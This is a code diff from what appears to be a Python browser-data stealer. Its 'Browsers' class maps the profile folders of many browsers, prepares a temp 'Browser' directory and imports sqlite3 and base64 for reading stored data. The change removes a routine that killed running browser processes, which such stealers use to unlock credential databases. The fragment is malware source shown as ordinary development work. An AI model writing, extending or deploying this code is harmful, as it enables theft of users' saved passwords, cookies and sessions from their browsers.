@@ -1,7 +1,6 @@
 import base64
 import json
 import os
-import psutil
 import random
 import sqlite3
 import threading
@@ -14,9 +13,6 @@ class Browsers:
 	def __init__(self):
 		self.appdata = os.getenv('LOCALAPPDATA')
 		self.roaming = os.getenv('APPDATA')
-		self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
-							"7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
-		self.browsers_found = []
 		self.browsers = {
 			'kometa': self.appdata + '\\Kometa\\User Data',
 			'orbitum': self.appdata + '\\Orbitum\\User Data',
@@ -44,17 +40,6 @@ class Browsers:
 			'Profile 4',
 			'Profile 5',
 		]
-
-		for proc in psutil.process_iter(['name']):
-			process_name = proc.info['name'].lower()
-			if process_name in self.browser_exe:
-				self.browsers_found.append(proc)
-
-		for proc in self.browsers_found:
-			try:
-				proc.kill()
-			except Exception:
-				pass
 
 		os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)
 
